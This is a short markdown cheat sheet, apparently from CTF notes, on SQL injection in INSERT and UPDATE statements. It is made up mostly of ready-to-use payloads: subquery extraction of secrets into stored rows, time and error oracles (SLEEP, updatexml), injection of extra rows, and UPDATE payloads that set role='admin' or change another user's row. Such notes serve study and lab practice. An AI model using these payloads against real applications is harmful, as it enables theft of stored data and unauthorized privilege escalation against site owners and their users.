# Injection in INSERT / UPDATE

**Signs**: signup, guestbook, comments, feedback, profile update — input is *stored*. Errors or
delays appear on submit; maybe the stored value is shown later.

## Shape the payload to the statement
`INSERT INTO t (name, message) VALUES ('<name>', '<message>')`

| Goal | `name` payload |
|---|---|
| Show subquery result in the stored row | `x', (SELECT secret FROM vault LIMIT 1)) -- ` → message column = secret, then view the guestbook |
| Time oracle | `x', (SELECT IF(<cond>,SLEEP(0.5),0))) -- ` |
| Error oracle (MySQL) | `x' AND updatexml(1,CONCAT(0x7e,(SELECT secret FROM vault LIMIT 1)),1) AND '` |
| Extra row (multi-row INSERT) | `x','y'),('z',(SELECT secret FROM vault)) -- ` |
| MySQL quirk | `x', message=(SELECT ...)` in `INSERT ... SET` / `ON DUPLICATE KEY UPDATE` |

Rules: match the **column count**, close the parentheses you opened, comment out the rest.
Stacked `; SELECT ...` is usually ignored by drivers (PyMySQL/mysqlclient execute one statement).

`UPDATE users SET bio='<bio>' WHERE id=5` → `x', role='admin` (changes another column), or
`x' WHERE username='admin' -- ` (changes another row — careful).

Then extract with [time-blind](time-blind.md) / [error-based](error-based.md) or read the stored
row back. Seen in: `sqli6` (Guestbook INSERT, time-based).
